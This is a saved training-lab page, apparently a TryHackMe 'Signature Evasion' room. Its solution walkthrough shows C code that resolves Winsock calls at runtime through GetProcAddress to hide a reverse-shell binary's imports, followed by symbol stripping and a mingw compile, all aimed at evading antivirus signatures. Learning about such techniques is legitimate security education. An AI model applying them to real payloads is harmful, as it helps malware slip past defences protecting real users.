<div style="border-radius:15px;border:1px solid #020c54;background-color:rgba(191,191,191,0.8);width:80%;margin:0 auto;padding:15px;margin-bottom:20px" data-pf_style_display="block" data-pf_style_visibility="visible"><details data-pf_style_display="block" data-pf_style_visibility="visible" open=""><summary data-pf_style_display="list-item" data-pf_style_visibility="visible"><u data-pf_style_display="inline" data-pf_style_visibility="visible"><i data-pf_style_display="inline" data-pf_style_visibility="visible">Solution Walkthrough (Click to read)</i></u></summary><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible"><br data-pf_style_display="inline" data-pf_style_visibility="visible"></span><p data-pf_style_display="block" data-pf_style_visibility="visible">For this challenge, we are given a binary we did not create. Our first goal is to get familiar with the binary from a reverse engineerâ€™s perspective. Are there any signatures? What does its PE structure look like? Is there any critical information in the IAT?</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">If you run the binary against ThreatCheck or a similar tool, you will notice it currently has no detections, so we can move on from that.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">If you inspect the binaries IAT table as discussed in task 6, you will notice there are roughly seven unique API calls that could indicate the objectives of this binary.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Letâ€™s focus our efforts on removing these from the IAT table and dynamically calling them. To recap what was covered in task 6: we need to identify a specific API call, obtain its structure from the&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list" data-pf_style_display="inline" data-pf_style_visibility="visible">Windows documentation</a>, load the library for the API calls, and obtain a pointer to the API call.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Weâ€™ll walk through dynamically calling one API call and then expect you to reiterate the steps for the rest of the calls.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Letâ€™s look at the&nbsp;<a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect" data-pf_style_display="inline" data-pf_style_visibility="visible">Windows document</a> for <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">WSAConnect</code>; below is the structure obtained from the documentation</p>
<pre class=" language-cpp" tabindex="0" data-pf_style_display="block" data-pf_style_visibility="visible"><code class=" language-cpp" data-pf_style_display="inline-block" data-pf_style_visibility="visible"><span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">int</span> WSAAPI <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">WSAConnect</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>
  <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">[</span>in<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">]</span>  SOCKET         s<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span>
  <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">[</span>in<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">]</span>  <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">const</span> sockaddr <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">*</span>name<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span>
  <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">[</span>in<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">]</span>  <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">int</span>            namelen<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span>
  <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">[</span>in<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">]</span>  LPWSABUF       lpCallerData<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span>
  <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">[</span>out<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">]</span> LPWSABUF       lpCalleeData<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span>
  <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">[</span>in<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">]</span>  LPQOS          lpSQOS<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span>
  <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">[</span>in<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">]</span>  LPQOS          lpGQOS
<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
</code></pre>
<p data-pf_style_display="block" data-pf_style_visibility="visible">We can now rewrite this to meet the requirements of a structure definition.</p>
<pre class=" language-cpp" tabindex="0" data-pf_style_display="block" data-pf_style_visibility="visible"><code class=" language-cpp" data-pf_style_display="inline-block" data-pf_style_visibility="visible"><span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">typedef</span> <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">int</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>WSAAPI<span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">*</span> WSACONNECT<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>SOCKET s<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span><span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">const</span> <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">struct</span> <span class="token class-name" data-pf_style_display="inline" data-pf_style_visibility="visible">sockaddr</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">*</span>name<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span><span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">int</span> namelen<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span>LPWSABUF lpCallerData<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span>LPWSABUF lpCalleeData<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span>LPQOS lpSQOS<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span>LPQOS lpGQOS<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
</code></pre>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Now we need to import the library the calls are stored in. This only needs to occur once since all calls use the same library.</p>
<pre class=" language-cpp" tabindex="0" data-pf_style_display="block" data-pf_style_visibility="visible"><code class=" language-cpp" data-pf_style_display="inline-block" data-pf_style_visibility="visible">HMODULE hws2_32 <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">LoadLibraryW</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>L<span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"ws2_32"</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
</code></pre>
<p data-pf_style_display="block" data-pf_style_visibility="visible">To use the API call, we must obtain the pointer to the address.</p>
<pre class=" language-cpp" tabindex="0" data-pf_style_display="block" data-pf_style_visibility="visible"><code class=" language-cpp" data-pf_style_display="inline-block" data-pf_style_visibility="visible">WSACONNECT myWSAConnect <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>WSACONNECT<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span> <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">GetProcAddress</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>hws2_32<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"WSAConnect"</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
</code></pre>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Once the pointer is obtained, we can change all occurrences of the API call with our new pointer.</p>
<pre class=" language-cpp" tabindex="0" data-pf_style_display="block" data-pf_style_visibility="visible"><code class=" language-cpp" data-pf_style_display="inline-block" data-pf_style_visibility="visible">mySocket <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">myWSASocketA</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>AF_INET<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> SOCK_STREAM<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> IPPROTO_TCP<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">0</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">0</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">0</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
</code></pre>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Once complete, your structure definition should look like the below code snippet</p><pre class=" language-c" tabindex="0" data-pf_style_display="block" data-pf_style_visibility="visible"><code class=" language-c" data-pf_style_display="inline-block" data-pf_style_visibility="visible"><span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">typedef</span> <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">int</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>WSAAPI<span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">*</span> WSASTARTUP<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>WORD wVersionRequested<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span>LPWSADATA lpWSAData<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
<span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">typedef</span> <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">SOCKET</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>WSAAPI<span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">*</span> WSASOCKETA<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">int</span> af<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span><span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">int</span> type<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span><span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">int</span> protocol<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span>LPWSAPROTOCOL_INFOA lpProtocolInfo<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span>GROUP g<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span>DWORD dwFlags<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
<span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">typedef</span> <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">unsigned</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>WSAAPI<span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">*</span> INET_ADDR<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">const</span> <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">char</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">*</span>cp<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
<span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">typedef</span> <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">u_short</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>WSAAPI<span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">*</span> HTONS<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>u_short hostshort<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
<span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">typedef</span> <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">int</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>WSAAPI<span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">*</span> WSACONNECT<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>SOCKET s<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span><span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">const</span> <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">struct</span> <span class="token class-name" data-pf_style_display="inline" data-pf_style_visibility="visible">sockaddr</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">*</span>name<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span><span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">int</span> namelen<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span>LPWSABUF lpCallerData<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span>LPWSABUF lpCalleeData<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span>LPQOS lpSQOS<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span>LPQOS lpGQOS<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
<span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">typedef</span> <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">int</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>WSAAPI<span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">*</span> CLOSESOCKET<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>SOCKET s<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
<span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">typedef</span> <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">int</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>WSAAPI<span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">*</span> WSACLEANUP<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">void</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
</code></pre><p data-pf_style_display="block" data-pf_style_visibility="visible">The below code snippet defines all pointer addresses needed, corresponding to the above structures.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">


</p><pre class=" language-c" tabindex="0" data-pf_style_display="block" data-pf_style_visibility="visible"><code class=" language-c" data-pf_style_display="inline-block" data-pf_style_visibility="visible">HMODULE hws2_32 <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">LoadLibraryW</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>L<span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"ws2_32"</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
WSASTARTUP myWSAStartup <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>WSASTARTUP<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span> <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">GetProcAddress</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>hws2_32<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"WSAStartup"</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
WSASOCKETA myWSASocketA <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>WSASOCKETA<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span> <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">GetProcAddress</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>hws2_32<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"WSASocketA"</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
INET_ADDR myinet_addr <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>INET_ADDR<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span> <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">GetProcAddress</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>hws2_32<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"inet_addr"</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
HTONS myhtons <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>HTONS<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span> <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">GetProcAddress</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>hws2_32<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"htons"</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
WSACONNECT myWSAConnect <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>WSACONNECT<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span> <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">GetProcAddress</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>hws2_32<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"WSAConnect"</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
CLOSESOCKET myclosesocket <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>CLOSESOCKET<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span> <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">GetProcAddress</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>hws2_32<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"closesocket"</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
WSACLEANUP myWSACleanup <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>WSACLEANUP<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span> <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">GetProcAddress</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>hws2_32<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"WSACleanup"</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span> </code></pre><p data-pf_style_display="block" data-pf_style_visibility="visible">Please note, the structure definitions should be outside of any function at the beginning of your code. The pointer definitions should be at the top of the <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">RunShell</code> function</p><p data-pf_style_display="block" data-pf_style_visibility="visible">We should now randomize the pointer and other variable names in proper best practice. We should also strip the binary of any symbols or other identifiable information.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">Once thoroughly obfuscated and information has been removed we can compile the binary using <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">mingw-gcc</code>.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">
</p><pre class=" language-bash" tabindex="0" data-pf_style_display="block" data-pf_style_visibility="visible"><code class=" language-bash" data-pf_style_display="inline-block" data-pf_style_visibility="visible">x86_64-w64-mingw32-gcc challenge.c -o challenge.exe -lwsock32 -lws2_32 </code></pre></details></div></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom red" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div data-pf_style_display="block" data-pf_style_visibility="visible">Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                What is the flag found on the Administrator desktop?
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{************** ****************}" value="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="1" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="7" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <i class="far fa-paper-plane" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i> Submit
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-8" data-pf_style_display="flex" data-pf_style_visibility="visible">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse8" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <a class="card-link" data-pf_style_display="inline" data-pf_style_visibility="visible">
                            <span class="task-dropdown-title hacker-green" data-pf_style_display="inline" data-pf_style_visibility="visible">Task 8                             <span class="task-dropdown-icon" data-pf_style_display="inline" data-pf_style_visibility="visible"><i class="fas fa-check-circle" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span></span> Conclusion
                            <span class="float-right" data-pf_style_display="block" data-pf_style_visibility="visible"><i class="fas fa-chevron-down" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span>
                            <span class="task-resources" data-pf_style_display="block" data-pf_style_visibility="visible"></span>
                        </a>
                    </div>
                    <div id="collapse8" class="collapse show" data-parent="#taskContent" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <div class="card-body task-complete" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <div class="room-task-desc" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div class="room-task-desc-data" data-pf_style_display="block" data-pf_style_visibility="visible"> <p data-pf_style_display="block" data-pf_style_visibility="visible">Signature evasion can kick off the process of preparing a malicious application to evade cutting-edge solutions and detection measures.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">In this room, we covered how to identify signatures and break various types of signatures.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">The techniques shown in this room are generally tool-agnostic and can be applied to many use cases as both tooling and defenses shift.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">At this point, you can begin understanding other more advanced detection measures or analysis techniques and continue improving your offensive tool craft.</p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div data-pf_style_display="block" data-pf_style_visibility="visible">Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                Read the above and continue learning!
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="1" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="8" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-success task-answer" disabled="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            Question Done
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div></div>
</div>
<div id="room-simple-details" data-pf_style_display="block" data-pf_style_visibility="visible"><div class="card cd-2 text-center mt-3" data-pf_style_display="flex" data-pf_style_visibility="visible"><div class="card-body" data-pf_style_display="block" data-pf_style_visibility="visible"><p class="size-18" data-pf_style_display="block" data-pf_style_visibility="visible">Created by <img class="avatar-tiny" src="./TryHackMe _ Signature Evasion_files/af7feb2c43a2c7d5f111b98ccbd15048.png" data-pf_style_display="inline" data-pf_style_visibility="visible" data-pf_rect_width="16" data-pf_rect_height="16"> 
        <a class="green-link" href="https://tryhackme.com/p/tryhackme" data-pf_style_display="inline" data-pf_style_visibility="visible">tryhackme</a> and <img class="avatar-tiny" src="./TryHackMe _ Signature Evasion_files/9e946af210ae86d6fbfda480d958b3fe.gif" data-pf_style_display="inline" data-pf_style_visibility="visible" data-pf_rect_width="16" data-pf_rect_height="16"> 
        <a class="green-link" href="https://tryhackme.com/p/Cryillic" data-pf_style_display="inline" data-pf_style_visibility="visible">Cryillic</a></p><p class="mb-0" data-pf_style_display="block" data-pf_style_visibility="visible">Only subscribers can deploy virtual machines in this room! 
        Go to your <a href="https://tryhackme.com/profile" data-pf_style_display="inline" data-pf_style_visibility="visible">profile</a> page to subscribe (if you have not already). 4490 users are in here and this room is 320 days old.</p></div></div></div>

</div>
</div>
</div>
<div id="room-content-attackbox" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
